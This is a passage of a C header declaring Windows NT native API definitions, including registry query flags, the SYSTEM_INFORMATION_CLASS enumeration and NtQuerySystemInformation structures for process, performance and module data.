#define RTL_QUERY_REGISTRY_NOEXPAND 0x00000010  // Used to suppress the expansion of
                                                // REG_MULTI_SZ into multiple callouts or
                                                // to prevent the expansion of environment
                                                // variable values in REG_EXPAND_SZ

#define RTL_QUERY_REGISTRY_DIRECT   0x00000020  // QueryRoutine field ignored.  EntryContext
                                                // field points to location to store value.
                                                // For null terminated strings, EntryContext
                                                // points to UNICODE_STRING structure that
                                                // that describes maximum size of buffer.
                                                // If .Buffer field is NULL then a buffer is
                                                // allocated.
                                                //

#define RTL_QUERY_REGISTRY_DELETE   0x00000040  // Used to delete value keys after they
                                                // are queried.


//
// The following values for the RelativeTo parameter determine what the
// Path parameter to RtlQueryRegistryValues is relative to.
//

#define RTL_REGISTRY_ABSOLUTE     0             // Path is a full path
#define RTL_REGISTRY_SERVICES     1             // \Registry\Machine\System\CurrentControlSet\Services
#define RTL_REGISTRY_CONTROL      2             // \Registry\Machine\System\CurrentControlSet\Control
#define RTL_REGISTRY_WINDOWS_NT   3             // \Registry\Machine\Software\Microsoft\Windows NT\CurrentVersion
#define RTL_REGISTRY_DEVICEMAP    4             // \Registry\Machine\Hardware\DeviceMap
#define RTL_REGISTRY_USER         5             // \Registry\User\CurrentUser
#define RTL_REGISTRY_MAXIMUM      6
#define RTL_REGISTRY_HANDLE       0x40000000    // Low order bits are registry handle
#define RTL_REGISTRY_OPTIONAL     0x80000000    // Indicates the key node is optional


typedef NTSTATUS (NTAPI * PRTL_QUERY_REGISTRY_ROUTINE)(
    IN PWSTR ValueName,
    IN ULONG ValueType,
    IN PVOID ValueData,
    IN ULONG ValueLength,
    IN PVOID Context,
    IN PVOID EntryContext
    );

typedef struct _RTL_QUERY_REGISTRY_TABLE
{
    PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
    ULONG Flags;
    PWSTR Name;
    PVOID EntryContext;
    ULONG DefaultType;
    PVOID DefaultData;
    ULONG DefaultLength;

} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;


NTSYSAPI
NTSTATUS
NTAPI
RtlQueryRegistryValues(
    IN ULONG  RelativeTo,
    IN PCWSTR  Path,
    IN PRTL_QUERY_REGISTRY_TABLE  QueryTable,
    IN PVOID  Context,
    IN PVOID  Environment OPTIONAL
    );


//-----------------------------------------------------------------------------
// Query system information

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation, // q: SYSTEM_BASIC_INFORMATION
    SystemProcessorInformation, // q: SYSTEM_PROCESSOR_INFORMATION
    SystemPerformanceInformation, // q: SYSTEM_PERFORMANCE_INFORMATION
    SystemTimeOfDayInformation, // q: SYSTEM_TIMEOFDAY_INFORMATION
    SystemPathInformation, // not implemented
    SystemProcessInformation, // q: SYSTEM_PROCESS_INFORMATION
    SystemCallCountInformation, // q: SYSTEM_CALL_COUNT_INFORMATION
    SystemDeviceInformation, // q: SYSTEM_DEVICE_INFORMATION
    SystemProcessorPerformanceInformation, // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION
    SystemFlagsInformation, // q: SYSTEM_FLAGS_INFORMATION
    SystemCallTimeInformation, // not implemented // SYSTEM_CALL_TIME_INFORMATION // 10
    SystemModuleInformation, // q: RTL_PROCESS_MODULES
    SystemLocksInformation, // q: RTL_PROCESS_LOCKS
    SystemStackTraceInformation, // q: RTL_PROCESS_BACKTRACES
    SystemPagedPoolInformation, // not implemented
    SystemNonPagedPoolInformation, // not implemented
    SystemHandleInformation, // q: SYSTEM_HANDLE_INFORMATION
    SystemObjectInformation, // q: SYSTEM_OBJECTTYPE_INFORMATION mixed with SYSTEM_OBJECT_INFORMATION
    SystemPageFileInformation, // q: SYSTEM_PAGEFILE_INFORMATION
    SystemVdmInstemulInformation, // q: SYSTEM_VDM_INSTEMUL_INFO
    SystemVdmBopInformation, // not implemented // 20
    SystemFileCacheInformation, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemCache)
    SystemPoolTagInformation, // q: SYSTEM_POOLTAG_INFORMATION
    SystemInterruptInformation, // q: SYSTEM_INTERRUPT_INFORMATION
    SystemDpcBehaviorInformation, // q: SYSTEM_DPC_BEHAVIOR_INFORMATION; s: SYSTEM_DPC_BEHAVIOR_INFORMATION (requires SeLoadDriverPrivilege)
    SystemFullMemoryInformation, // not implemented
    SystemLoadGdiDriverInformation, // s (kernel-mode only)
    SystemUnloadGdiDriverInformation, // s (kernel-mode only)
    SystemTimeAdjustmentInformation, // q: SYSTEM_QUERY_TIME_ADJUST_INFORMATION; s: SYSTEM_SET_TIME_ADJUST_INFORMATION (requires SeSystemtimePrivilege)
    SystemSummaryMemoryInformation, // not implemented
    SystemMirrorMemoryInformation, // s (requires license value "Kernel-MemoryMirroringSupported") (requires SeShutdownPrivilege) // 30
    SystemPerformanceTraceInformation, // q; s: (type depends on EVENT_TRACE_INFORMATION_CLASS)
    SystemObsolete0, // not implemented
    SystemExceptionInformation, // q: SYSTEM_EXCEPTION_INFORMATION
    SystemCrashDumpStateInformation, // s: SYSTEM_CRASH_DUMP_STATE_INFORMATION (requires SeDebugPrivilege)
    SystemKernelDebuggerInformation, // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION
    SystemContextSwitchInformation, // q: SYSTEM_CONTEXT_SWITCH_INFORMATION
    SystemRegistryQuotaInformation, // q: SYSTEM_REGISTRY_QUOTA_INFORMATION; s (requires SeIncreaseQuotaPrivilege)
    SystemExtendServiceTableInformation, // s (requires SeLoadDriverPrivilege) // loads win32k only
    SystemPrioritySeperation, // s (requires SeTcbPrivilege)
    SystemVerifierAddDriverInformation, // s (requires SeDebugPrivilege) // 40
    SystemVerifierRemoveDriverInformation, // s (requires SeDebugPrivilege)
    SystemProcessorIdleInformation, // q: SYSTEM_PROCESSOR_IDLE_INFORMATION
    SystemLegacyDriverInformation, // q: SYSTEM_LEGACY_DRIVER_INFORMATION
    SystemCurrentTimeZoneInformation, // q; s: RTL_TIME_ZONE_INFORMATION
    SystemLookasideInformation, // q: SYSTEM_LOOKASIDE_INFORMATION
    SystemTimeSlipNotification, // s (requires SeSystemtimePrivilege)
    SystemSessionCreate, // not implemented
    SystemSessionDetach, // not implemented
    SystemSessionInformation, // not implemented (SYSTEM_SESSION_INFORMATION)
    SystemRangeStartInformation, // q: SYSTEM_RANGE_START_INFORMATION // 50
    SystemVerifierInformation, // q: SYSTEM_VERIFIER_INFORMATION; s (requires SeDebugPrivilege)
    SystemVerifierThunkExtend, // s (kernel-mode only)
    SystemSessionProcessInformation, // q: SYSTEM_SESSION_PROCESS_INFORMATION
    SystemLoadGdiDriverInSystemSpace, // s (kernel-mode only) (same as SystemLoadGdiDriverInformation)
    SystemNumaProcessorMap, // q
    SystemPrefetcherInformation, // q: PREFETCHER_INFORMATION; s: PREFETCHER_INFORMATION // PfSnQueryPrefetcherInformation
    SystemExtendedProcessInformation, // q: SYSTEM_PROCESS_INFORMATION
    SystemRecommendedSharedDataAlignment, // q
    SystemComPlusPackage, // q; s
    SystemNumaAvailableMemory, // 60
    SystemProcessorPowerInformation, // q: SYSTEM_PROCESSOR_POWER_INFORMATION
    SystemEmulationBasicInformation,
    SystemEmulationProcessorInformation,
    SystemExtendedHandleInformation, // q: SYSTEM_HANDLE_INFORMATION_EX
    SystemLostDelayedWriteInformation, // q: ULONG
    SystemBigPoolInformation, // q: SYSTEM_BIGPOOL_INFORMATION
    SystemSessionPoolTagInformation, // q: SYSTEM_SESSION_POOLTAG_INFORMATION
    SystemSessionMappedViewInformation, // q: SYSTEM_SESSION_MAPPED_VIEW_INFORMATION
    SystemHotpatchInformation, // q; s: SYSTEM_HOTPATCH_CODE_INFORMATION
    SystemObjectSecurityMode, // q: ULONG // 70
    SystemWatchdogTimerHandler, // s (kernel-mode only)
    SystemWatchdogTimerInformation, // q (kernel-mode only); s (kernel-mode only)
    SystemLogicalProcessorInformation, // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION
    SystemWow64SharedInformationObsolete, // not implemented
    SystemRegisterFirmwareTableInformationHandler, // s: SYSTEM_FIRMWARE_TABLE_HANDLER // (kernel-mode only)
    SystemFirmwareTableInformation, // SYSTEM_FIRMWARE_TABLE_INFORMATION
    SystemModuleInformationEx, // q: RTL_PROCESS_MODULE_INFORMATION_EX
    SystemVerifierTriageInformation, // not implemented
    SystemSuperfetchInformation, // q; s: SUPERFETCH_INFORMATION // PfQuerySuperfetchInformation
    SystemMemoryListInformation, // q: SYSTEM_MEMORY_LIST_INFORMATION; s: SYSTEM_MEMORY_LIST_COMMAND (requires SeProfileSingleProcessPrivilege) // 80
    SystemFileCacheInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (same as SystemFileCacheInformation)
    SystemThreadPriorityClientIdInformation, // s: SYSTEM_THREAD_CID_PRIORITY_INFORMATION (requires SeIncreaseBasePriorityPrivilege)
    SystemProcessorIdleCycleTimeInformation, // q: SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION[]
    SystemVerifierCancellationInformation, // SYSTEM_VERIFIER_CANCELLATION_INFORMATION // name:wow64:whNT32QuerySystemVerifierCancellationInformation
    SystemProcessorPowerInformationEx, // not implemented
    SystemRefTraceInformation, // q; s: SYSTEM_REF_TRACE_INFORMATION // ObQueryRefTraceInformation
    SystemSpecialPoolInformation, // q; s: SYSTEM_SPECIAL_POOL_INFORMATION (requires SeDebugPrivilege) // MmSpecialPoolTag, then MmSpecialPoolCatchOverruns != 0
    SystemProcessIdInformation, // q: SYSTEM_PROCESS_ID_INFORMATION
    SystemErrorPortInformation, // s (requires SeTcbPrivilege)
    SystemBootEnvironmentInformation, // q: SYSTEM_BOOT_ENVIRONMENT_INFORMATION // 90
    SystemHypervisorInformation, // q; s (kernel-mode only)
    SystemVerifierInformationEx, // q; s: SYSTEM_VERIFIER_INFORMATION_EX
    SystemTimeZoneInformation, // s (requires SeTimeZonePrivilege)
    SystemImageFileExecutionOptionsInformation, // s: SYSTEM_IMAGE_FILE_EXECUTION_OPTIONS_INFORMATION (requires SeTcbPrivilege)
    SystemCoverageInformation, // q; s // name:wow64:whNT32QuerySystemCoverageInformation; ExpCovQueryInformation
    SystemPrefetchPatchInformation, // SYSTEM_PREFETCH_PATCH_INFORMATION
    SystemVerifierFaultsInformation, // s: SYSTEM_VERIFIER_FAULTS_INFORMATION (requires SeDebugPrivilege)
    SystemSystemPartitionInformation, // q: SYSTEM_SYSTEM_PARTITION_INFORMATION
    SystemSystemDiskInformation, // q: SYSTEM_SYSTEM_DISK_INFORMATION
    SystemProcessorPerformanceDistribution, // q: SYSTEM_PROCESSOR_PERFORMANCE_DISTRIBUTION // 100
    SystemNumaProximityNodeInformation,
    SystemDynamicTimeZoneInformation, // q; s (requires SeTimeZonePrivilege)
    SystemCodeIntegrityInformation, // q: SYSTEM_CODEINTEGRITY_INFORMATION // SeCodeIntegrityQueryInformation
    SystemProcessorMicrocodeUpdateInformation, // s: SYSTEM_PROCESSOR_MICROCODE_UPDATE_INFORMATION
    SystemProcessorBrandString, // q // HaliQuerySystemInformation -> HalpGetProcessorBrandString, info class 23
    SystemVirtualAddressInformation, // q: SYSTEM_VA_LIST_INFORMATION[]; s: SYSTEM_VA_LIST_INFORMATION[] (requires SeIncreaseQuotaPrivilege) // MmQuerySystemVaInformation
    SystemLogicalProcessorAndGroupInformation, // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX // since WIN7 // KeQueryLogicalProcessorRelationship
    SystemProcessorCycleTimeInformation, // q: SYSTEM_PROCESSOR_CYCLE_TIME_INFORMATION[]
    SystemStoreInformation, // q; s: SYSTEM_STORE_INFORMATION // SmQueryStoreInformation
    SystemRegistryAppendString, // s: SYSTEM_REGISTRY_APPEND_STRING_PARAMETERS // 110
    SystemAitSamplingValue, // s: ULONG (requires SeProfileSingleProcessPrivilege)
    SystemVhdBootInformation, // q: SYSTEM_VHD_BOOT_INFORMATION
    SystemCpuQuotaInformation, // q; s // PsQueryCpuQuotaInformation
    SystemNativeBasicInformation, // not implemented
    SystemErrorPortTimeouts, // SYSTEM_ERROR_PORT_TIMEOUTS
    SystemLowPriorityIoInformation, // q: SYSTEM_LOW_PRIORITY_IO_INFORMATION
    SystemTpmBootEntropyInformation, // q: TPM_BOOT_ENTROPY_NT_RESULT // ExQueryTpmBootEntropyInformation
    SystemVerifierCountersInformation, // q: SYSTEM_VERIFIER_COUNTERS_INFORMATION
    SystemPagedPoolInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypePagedPool)
    SystemSystemPtesInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemPtes) // 120
    SystemNodeDistanceInformation,
    SystemAcpiAuditInformation, // q: SYSTEM_ACPI_AUDIT_INFORMATION // HaliQuerySystemInformation -> HalpAuditQueryResults, info class 26
    SystemBasicPerformanceInformation, // q: SYSTEM_BASIC_PERFORMANCE_INFORMATION // name:wow64:whNtQuerySystemInformation_SystemBasicPerformanceInformation
    SystemQueryPerformanceCounterInformation, // q: SYSTEM_QUERY_PERFORMANCE_COUNTER_INFORMATION // since WIN7 SP1
    SystemSessionBigPoolInformation, // q: SYSTEM_SESSION_POOLTAG_INFORMATION // since WIN8
    SystemBootGraphicsInformation, // q; s: SYSTEM_BOOT_GRAPHICS_INFORMATION (kernel-mode only)
    SystemScrubPhysicalMemoryInformation, // q; s: MEMORY_SCRUB_INFORMATION
    SystemBadPageInformation,
    SystemProcessorProfileControlArea, // q; s: SYSTEM_PROCESSOR_PROFILE_CONTROL_AREA
    SystemCombinePhysicalMemoryInformation, // s: MEMORY_COMBINE_INFORMATION, MEMORY_COMBINE_INFORMATION_EX, MEMORY_COMBINE_INFORMATION_EX2 // 130
    SystemEntropyInterruptTimingInformation,
    SystemConsoleInformation, // q: SYSTEM_CONSOLE_INFORMATION
    SystemPlatformBinaryInformation, // q: SYSTEM_PLATFORM_BINARY_INFORMATION
    SystemPolicyInformation, // SYSTEM_POLICY_INFORMATION
    SystemHypervisorProcessorCountInformation, // q: SYSTEM_HYPERVISOR_PROCESSOR_COUNT_INFORMATION
    SystemDeviceDataInformation, // q: SYSTEM_DEVICE_DATA_INFORMATION
    SystemDeviceDataEnumerationInformation, // q: SYSTEM_DEVICE_DATA_INFORMATION
    SystemMemoryTopologyInformation, // q: SYSTEM_MEMORY_TOPOLOGY_INFORMATION
    SystemMemoryChannelInformation, // q: SYSTEM_MEMORY_CHANNEL_INFORMATION
    SystemBootLogoInformation, // q: SYSTEM_BOOT_LOGO_INFORMATION // 140
    SystemProcessorPerformanceInformationEx, // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX // since WINBLUE
    SystemCriticalProcessErrorLogInformation,
    SystemSecureBootPolicyInformation, // q: SYSTEM_SECUREBOOT_POLICY_INFORMATION
    SystemPageFileInformationEx, // q: SYSTEM_PAGEFILE_INFORMATION_EX
    SystemSecureBootInformation, // q: SYSTEM_SECUREBOOT_INFORMATION
    SystemEntropyInterruptTimingRawInformation,
    SystemPortableWorkspaceEfiLauncherInformation, // q: SYSTEM_PORTABLE_WORKSPACE_EFI_LAUNCHER_INFORMATION
    SystemFullProcessInformation, // q: SYSTEM_PROCESS_INFORMATION with SYSTEM_PROCESS_INFORMATION_EXTENSION (requires admin)
    SystemKernelDebuggerInformationEx, // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX
    SystemBootMetadataInformation, // 150
    SystemSoftRebootInformation, // q: ULONG
    SystemElamCertificateInformation, // s: SYSTEM_ELAM_CERTIFICATE_INFORMATION
    SystemOfflineDumpConfigInformation,
    SystemProcessorFeaturesInformation, // q: SYSTEM_PROCESSOR_FEATURES_INFORMATION
    SystemRegistryReconciliationInformation, // s: NULL (requires admin) (flushes registry hives)
    SystemEdidInformation,
    SystemManufacturingInformation, // q: SYSTEM_MANUFACTURING_INFORMATION // since THRESHOLD
    SystemEnergyEstimationConfigInformation, // q: SYSTEM_ENERGY_ESTIMATION_CONFIG_INFORMATION
    SystemHypervisorDetailInformation, // q: SYSTEM_HYPERVISOR_DETAIL_INFORMATION
    SystemProcessorCycleStatsInformation, // q: SYSTEM_PROCESSOR_CYCLE_STATS_INFORMATION // 160
    SystemVmGenerationCountInformation,
    SystemTrustedPlatformModuleInformation, // q: SYSTEM_TPM_INFORMATION
    SystemKernelDebuggerFlags, // SYSTEM_KERNEL_DEBUGGER_FLAGS
    SystemCodeIntegrityPolicyInformation, // q: SYSTEM_CODEINTEGRITYPOLICY_INFORMATION
    SystemIsolatedUserModeInformation, // q: SYSTEM_ISOLATED_USER_MODE_INFORMATION
    SystemHardwareSecurityTestInterfaceResultsInformation,
    SystemSingleModuleInformation, // q: SYSTEM_SINGLE_MODULE_INFORMATION
    SystemAllowedCpuSetsInformation,
    SystemVsmProtectionInformation, // q: SYSTEM_VSM_PROTECTION_INFORMATION (previously SystemDmaProtectionInformation)
    SystemInterruptCpuSetsInformation, // q: SYSTEM_INTERRUPT_CPU_SET_INFORMATION // 170
    SystemSecureBootPolicyFullInformation, // q: SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION
    SystemCodeIntegrityPolicyFullInformation,
    SystemAffinitizedInterruptProcessorInformation,
    SystemRootSiloInformation, // q: SYSTEM_ROOT_SILO_INFORMATION
    SystemCpuSetInformation, // q: SYSTEM_CPU_SET_INFORMATION // since THRESHOLD2
    SystemCpuSetTagInformation, // q: SYSTEM_CPU_SET_TAG_INFORMATION
    SystemWin32WerStartCallout,
    SystemSecureKernelProfileInformation, // q: SYSTEM_SECURE_KERNEL_HYPERGUARD_PROFILE_INFORMATION
    SystemCodeIntegrityPlatformManifestInformation, // q: SYSTEM_SECUREBOOT_PLATFORM_MANIFEST_INFORMATION // since REDSTONE
    SystemInterruptSteeringInformation, // SYSTEM_INTERRUPT_STEERING_INFORMATION_INPUT // 180
    SystemSupportedProcessorArchitectures,
    SystemMemoryUsageInformation, // q: SYSTEM_MEMORY_USAGE_INFORMATION
    SystemCodeIntegrityCertificateInformation, // q: SYSTEM_CODEINTEGRITY_CERTIFICATE_INFORMATION
    SystemPhysicalMemoryInformation, // q: SYSTEM_PHYSICAL_MEMORY_INFORMATION // since REDSTONE2
    SystemControlFlowTransition,
    SystemKernelDebuggingAllowed, // s: ULONG
    SystemActivityModerationExeState, // SYSTEM_ACTIVITY_MODERATION_EXE_STATE
    SystemActivityModerationUserSettings, // SYSTEM_ACTIVITY_MODERATION_USER_SETTINGS
    SystemCodeIntegrityPoliciesFullInformation,
    SystemCodeIntegrityUnlockInformation, // SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION // 190
    SystemIntegrityQuotaInformation,
    SystemFlushInformation, // q: SYSTEM_FLUSH_INFORMATION
    SystemProcessorIdleMaskInformation, // q: ULONG_PTR // since REDSTONE3
    SystemSecureDumpEncryptionInformation,
    SystemWriteConstraintInformation, // SYSTEM_WRITE_CONSTRAINT_INFORMATION
    SystemKernelVaShadowInformation, // SYSTEM_KERNEL_VA_SHADOW_INFORMATION
    SystemHypervisorSharedPageInformation, // SYSTEM_HYPERVISOR_SHARED_PAGE_INFORMATION // since REDSTONE4
    SystemFirmwareBootPerformanceInformation,
    SystemCodeIntegrityVerificationInformation, // SYSTEM_CODEINTEGRITYVERIFICATION_INFORMATION
    SystemFirmwarePartitionInformation, // SYSTEM_FIRMWARE_PARTITION_INFORMATION // 200
    SystemSpeculationControlInformation, // SYSTEM_SPECULATION_CONTROL_INFORMATION // (CVE-2017-5715) REDSTONE3 and above.
    SystemDmaGuardPolicyInformation, // SYSTEM_DMA_GUARD_POLICY_INFORMATION
    SystemEnclaveLaunchControlInformation, // SYSTEM_ENCLAVE_LAUNCH_CONTROL_INFORMATION
    SystemWorkloadAllowedCpuSetsInformation, // SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION // since REDSTONE5
    SystemCodeIntegrityUnlockModeInformation,
    SystemLeapSecondInformation, // SYSTEM_LEAP_SECOND_INFORMATION
    SystemFlags2Information, // q: SYSTEM_FLAGS_INFORMATION
    SystemSecurityModelInformation, // SYSTEM_SECURITY_MODEL_INFORMATION // since 19H1
    SystemCodeIntegritySyntheticCacheInformation,
    SystemFeatureConfigurationInformation, // SYSTEM_FEATURE_CONFIGURATION_INFORMATION // since 20H1 // 210
    SystemFeatureConfigurationSectionInformation, // SYSTEM_FEATURE_CONFIGURATION_SECTIONS_INFORMATION
    SystemFeatureUsageSubscriptionInformation,
    SystemSecureSpeculationControlInformation, // SECURE_SPECULATION_CONTROL_INFORMATION
    // SystemSpacesBootInformation = 214,
    // SystemFwRamdiskInformation = 215,
    // SystemWheaIpmiHardwareInformation = 216,
    // SystemDifSetRuleClassInformation = 217,
    // SystemDifClearRuleClassInformation = 218,
    // SystemDifApplyPluginVerificationOnDriver = 219,
    // SystemDifRemovePluginVerificationOnDriver = 220,
    // SystemShadowStackInformation = 221, // SYSTEM_SHADOW_STACK_INFORMATION
    // SystemBuildVersionInformation = 222, // SYSTEM_BUILD_VERSION_INFORMATION
    MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS;

//
// Thread priority
//

typedef LONG KPRIORITY;

//
// Basic System information
// NtQuerySystemInformation with SystemBasicInformation
//

typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG MinimumUserModeAddress;
    ULONG MaximumUserModeAddress;
    KAFFINITY ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION
{
    SIZE_T Size; // set to sizeof structure on input
    //PROCESS_BASIC_INFORMATION BasicInfo;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG IsProtectedProcess : 1;
            ULONG IsWow64Process : 1;
            ULONG IsProcessDeleting : 1;
            ULONG IsCrossSessionCreate : 1;
            ULONG IsFrozen : 1;
            ULONG IsBackground : 1;
            ULONG IsStronglyNamed : 1;
            ULONG IsSecureProcess : 1;
            ULONG IsSubsystemProcess : 1;
            ULONG SpareBits : 23;
        };
    };
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

//
// Processor information
// NtQuerySystemInformation with SystemProcessorInformation
//

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
    USHORT ProcessorArchitecture;
    USHORT ProcessorLevel;
    USHORT ProcessorRevision;
    USHORT Reserved;
    ULONG ProcessorFeatureBits;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

//
// Performance information
// NtQuerySystemInformation with SystemPerformanceInformation
//

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
    LARGE_INTEGER IdleProcessTime;
    LARGE_INTEGER IoReadTransferCount;
    LARGE_INTEGER IoWriteTransferCount;
    LARGE_INTEGER IoOtherTransferCount;
    ULONG IoReadOperationCount;
    ULONG IoWriteOperationCount;
    ULONG IoOtherOperationCount;
    ULONG AvailablePages;
    ULONG CommittedPages;
    ULONG CommitLimit;
    ULONG PeakCommitment;
    ULONG PageFaultCount;
    ULONG CopyOnWriteCount;
    ULONG TransitionCount;
    ULONG CacheTransitionCount;
    ULONG DemandZeroCount;
    ULONG PageReadCount;
    ULONG PageReadIoCount;
    ULONG CacheReadCount;
    ULONG CacheIoCount;
    ULONG DirtyPagesWriteCount;
    ULONG DirtyWriteIoCount;
    ULONG MappedPagesWriteCount;
    ULONG MappedWriteIoCount;
    ULONG PagedPoolPages;
    ULONG NonPagedPoolPages;
    ULONG PagedPoolAllocs;
    ULONG PagedPoolFrees;
    ULONG NonPagedPoolAllocs;
    ULONG NonPagedPoolFrees;
    ULONG FreeSystemPtes;
    ULONG ResidentSystemCodePage;
    ULONG TotalSystemDriverPages;
    ULONG TotalSystemCodePages;
    ULONG NonPagedPoolLookasideHits;
    ULONG PagedPoolLookasideHits;
    ULONG Spare3Count;
    ULONG ResidentSystemCachePage;
    ULONG ResidentPagedPoolPage;
    ULONG ResidentSystemDriverPage;
    ULONG CcFastReadNoWait;
    ULONG CcFastReadWait;
    ULONG CcFastReadResourceMiss;
    ULONG CcFastReadNotPossible;
    ULONG CcFastMdlReadNoWait;
    ULONG CcFastMdlReadWait;
    ULONG CcFastMdlReadResourceMiss;
    ULONG CcFastMdlReadNotPossible;
    ULONG CcMapDataNoWait;
    ULONG CcMapDataWait;
    ULONG CcMapDataNoWaitMiss;
    ULONG CcMapDataWaitMiss;
    ULONG CcPinMappedDataCount;
    ULONG CcPinReadNoWait;
    ULONG CcPinReadWait;
    ULONG CcPinReadNoWaitMiss;
    ULONG CcPinReadWaitMiss;
    ULONG CcCopyReadNoWait;
    ULONG CcCopyReadWait;
    ULONG CcCopyReadNoWaitMiss;
    ULONG CcCopyReadWaitMiss;
    ULONG CcMdlReadNoWait;
    ULONG CcMdlReadWait;
    ULONG CcMdlReadNoWaitMiss;
    ULONG CcMdlReadWaitMiss;
    ULONG CcReadAheadIos;
    ULONG CcLazyWriteIos;
    ULONG CcLazyWritePages;
    ULONG CcDataFlushes;
    ULONG CcDataPages;
    ULONG ContextSwitches;
    ULONG FirstLevelTbFills;
    ULONG SecondLevelTbFills;
    ULONG SystemCalls;
} SYSTEM_PERFORMANCE_INFORMATION, *PSYSTEM_PERFORMANCE_INFORMATION;

//
// Time of Day information
// NtQuerySystemInformation with SystemTimeOfDayInformation
//

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
    LARGE_INTEGER BootTime;
    LARGE_INTEGER CurrentTime;
    LARGE_INTEGER TimeZoneBias;
    ULONG TimeZoneId;
    ULONG Reserved;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

//
// Process information
// NtQuerySystemInformation with SystemProcessInformation
//

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
    ULONG HandleCount;
    // Next part is platform dependent

} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

//
// Device information
// NtQuerySystemInformation with SystemDeviceInformation
//

typedef struct _SYSTEM_DEVICE_INFORMATION {
    ULONG NumberOfDisks;
    ULONG NumberOfFloppies;
    ULONG NumberOfCdRoms;
    ULONG NumberOfTapes;
    ULONG NumberOfSerialPorts;
    ULONG NumberOfParallelPorts;
} SYSTEM_DEVICE_INFORMATION, *PSYSTEM_DEVICE_INFORMATION;

//
// Processor performance information
// NtQuerySystemInformation with SystemProcessorPerformanceInformation
//

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
    LARGE_INTEGER IdleTime;
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER DpcTime;          // DEVL only
    LARGE_INTEGER InterruptTime;    // DEVL only
    ULONG InterruptCount;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, *PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

//
// NT Global Flag information
// NtQuerySystemInformation with SystemFlagsInformation
//

typedef struct _SYSTEM_FLAGS_INFORMATION
{
    ULONG GlobalFlag;

} SYSTEM_FLAGS_INFORMATION, *PSYSTEM_FLAGS_INFORMATION;

//
// System Module information
// NtQuerySystemInformation with SystemModuleInformation
//

typedef struct _SYSTEM_MODULE
{
    ULONG  Reserved1;                   // Should be 0xBAADF00D
    ULONG  Reserved2;                   // Should be zero
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   ImageName[256];

} SYSTEM_MODULE, *PSYSTEM_MODULE;


typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];

} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

/*
typedef struct _SYSTEM_VDM_INSTEMUL_INFO {
    ULONG SegmentNotPresent ;
    ULONG VdmOpcode0F       ;
    ULONG OpcodeESPrefix    ;
    ULONG OpcodeCSPrefix    ;
    ULONG OpcodeSSPrefix    ;
    ULONG OpcodeDSPrefix    ;
    ULONG OpcodeFSPrefix    ;
    ULONG OpcodeGSPrefix    ;
    ULONG OpcodeOPER32Prefix;
    ULONG OpcodeADDR32Prefix;
    ULONG OpcodeINSB        ;
    ULONG OpcodeINSW        ;
    ULONG OpcodeOUTSB       ;
    ULONG OpcodeOUTSW       ;
    ULONG OpcodePUSHF       ;
    ULONG OpcodePOPF        ;
    ULONG OpcodeINTnn       ;
    ULONG OpcodeINTO        ;
    ULONG OpcodeIRET        ;
    ULONG OpcodeINBimm      ;
    ULONG OpcodeINWimm      ;
    ULONG OpcodeOUTBimm     ;
    ULONG OpcodeOUTWimm     ;
    ULONG OpcodeINB         ;
    ULONG OpcodeINW         ;
    ULONG OpcodeOUTB        ;
    ULONG OpcodeOUTW        ;
    ULONG OpcodeLOCKPrefix  ;
    ULONG OpcodeREPNEPrefix ;
